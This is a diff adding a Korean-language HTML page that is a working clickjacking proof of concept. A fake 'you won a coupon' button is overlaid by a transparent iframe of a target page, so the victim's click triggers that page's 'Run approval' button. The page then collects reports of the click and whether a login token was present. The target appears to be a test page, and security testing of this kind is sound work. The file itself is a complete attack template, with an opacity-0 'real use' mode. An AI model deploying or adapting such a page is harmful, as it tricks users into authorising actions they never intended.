@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>이벤트 당첨 안내</title>
+<style>
+  html, body { margin: 0; padding: 0; font-family: sans-serif; background: #fff8e1; }
+  #stage { position: relative; height: 640px; overflow: hidden; background: #fff8e1; }
+  #decoy { position: absolute; top: 0; left: 0; width: 100%; z-index: 1; }
+  #decoy h1 { font-size: 20px; text-align: center; margin: 14px 8px 4px; }
+  #decoy p { text-align: center; margin: 2px 8px; font-size: 14px; }
+  #decoyBtn {
+    position: absolute; top: 180px; left: 0; width: 100%; height: 84px;
+    background: #ff6b6b; color: #fff; font-size: 24px; font-weight: bold;
+    display: flex; align-items: center; justify-content: center;
+  }
+  #victim {
+    position: absolute; top: 0; left: 0; width: 100%; height: 640px;
+    border: 0; z-index: 2; opacity: 0.35;
+  }
+  .panel { padding: 14px; background: #fff; }
+  .panel button { font-size: 15px; padding: 10px 14px; margin: 0 6px 8px 0; cursor: pointer; }
+  #status { font-size: 14px; white-space: pre-wrap; word-break: break-all; background: #f5f5f5; padding: 10px; min-height: 90px; }
+  .note { font-size: 13px; color: #555; padding: 0 14px 18px; background: #fff; }
+</style>
+</head>
+<body>
+<div id="stage">
+  <div id="decoy">
+    <h1>축하합니다! 쿠폰에 당첨되셨습니다</h1>
+    <p>아래 버튼을 눌러 쿠폰을 받아가세요.</p>
+    <div id="decoyBtn">쿠폰 받기</div>
+  </div>
+  <iframe id="victim" src="https://sampple-korea.github.io/cj-test/target.html" title="target" scrolling="no"></iframe>
+</div>
+<div class="panel">
+  <div>
+    <button type="button" onclick="setOpacity(0)">iframe 투명도 0 (실전)</button>
+    <button type="button" onclick="setOpacity(0.35)">0.35 (확인용)</button>
+    <button type="button" onclick="setOpacity(1)">1 (위치 확인)</button>
+  </div>
+  <div id="status">대상 페이지로부터의 보고를 기다리는 중…</div>
+</div>
+<p class="note">
+  테스트 안내: 빨간 "쿠폰 받기" 자리에 반투명하게 대상 페이지의 초록 "승인 실행" 버튼이 겹쳐 보이면 정렬된 것입니다.
+  그 상태에서 "쿠폰 받기"를 한 번 누르세요. 클릭은 위에 있는 iframe으로 전달됩니다.
+  아래 상태창에 승인 클릭 보고와 토큰 유무가 표시되고, 같은 내용이 기록 서버에도 남습니다.
+</p>
+<script>
+function setOpacity(v) { document.getElementById('victim').style.opacity = v; }
+window.addEventListener('message', function (e) {
+  var d = e.data;
+  if (!d || d.type !== 'cj-report') return;
+  var t = new Date();
+  var hh = ('0' + t.getHours()).slice(-2), mm = ('0' + t.getMinutes()).slice(-2), ss = ('0' + t.getSeconds()).slice(-2);
+  var line = '[' + hh + ':' + mm + ':' + ss + '] 보고: ' + d.event + ' / 토큰=' + (d.token ? '있음(로그인 상태)' : '없음(로그아웃)') + '\n';
+  var box = document.getElementById('status');
+  if (box.dataset.started !== '1') { box.textContent = ''; box.dataset.started = '1'; }
+  box.textContent += line;
+});
+</script>
+</body>
+</html>
